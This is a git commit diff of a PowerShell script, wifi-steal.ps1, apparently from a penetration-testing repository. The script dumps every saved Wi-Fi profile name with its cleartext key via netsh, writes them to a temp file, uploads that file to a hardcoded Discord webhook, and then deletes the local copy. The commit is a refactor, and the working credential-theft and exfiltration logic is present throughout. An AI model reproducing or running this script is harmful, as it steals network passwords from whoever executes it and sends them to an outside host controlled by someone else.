20e4c8e074efcfa151f4ef819c84d51dbe3fa159
SecureMedica <pentester1.securemedica@gmail.com>
2025-04-15 13:38:41 +0200

    Update wifi-steal.ps1

--- wifi-steal.ps1
+++ wifi-steal.ps1
@@ -1,39 +1,32 @@
 $n = "$env:TEMP\$env:UserName.txt"
 $w = 'https://discord.com/api/webhooks/1361318439314128928/0ysFUO-d6BMEU4T7fQmlHVCAU2lK8-3gr-HgTDMOwu3QZ1ikm1_k9t9LAPMLM1IBg--z'
 
-(netsh wlan show profiles) |
-  Select-String ':(.+)$' |
-  % {
+$wifi = (netsh wlan show profiles) | Select-String ':(.+)$' | ForEach-Object {
     $p = $_.Matches.Groups[1].Value.Trim()
     (netsh wlan show profile name="$p" key=clear) |
-      Select-String 'Key Content.+:(.+)$' |
-      % {
+    Select-String 'Key Content.+:(.+)$' |
+    ForEach-Object {
         $k = $_.Matches.Groups[1].Value.Trim()
-        [PSCustomObject]@{PROFILE_NAME = $p; PASSWORD = $k}
-      }
-  } | Out-File $n
-
-Start-Sleep -Milliseconds 500
-
-$boundary = [System.Guid]::NewGuid().ToString()
-$LF = "`r`n"
-
-$headers = @{
-  "Content-Type" = "multipart/form-data; boundary=$boundary"
+        "$p : $k"
+    }
 }
 
-$fileContent = Get-Content $n -Raw
-$bodyLines = @(
-  "--$boundary",
-  'Content-Disposition: form-data; name="file"; filename="' + $n + '"',
-  'Content-Type: text/plain',
-  '',
-  $fileContent,
-  "--$boundary--"
-) -join $LF
+$wifi | Set-Content $n
+Start-Sleep -Milliseconds 500
 
-$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)
+$bd = [guid]::NewGuid().ToString()
+$lf = "`r`n"
+$h = @{ 'Content-Type' = "multipart/form-data; boundary=$bd" }
+$c = Get-Content $n -Raw
+$b = @(
+    "--$bd",
+    'Content-Disposition: form-data; name="file"; filename="' + $n + '"',
+    'Content-Type: text/plain',
+    '',
+    $c,
+    "--$bd--"
+) -join $lf
 
-Invoke-RestMethod -Uri $w -Method POST -Headers $headers -Body $bodyBytes
-
+$d = [System.Text.Encoding]::UTF8.GetBytes($b)
+Invoke-RestMethod -Uri $w -Method POST -Headers $h -Body $d
 Remove-Item $n -Force
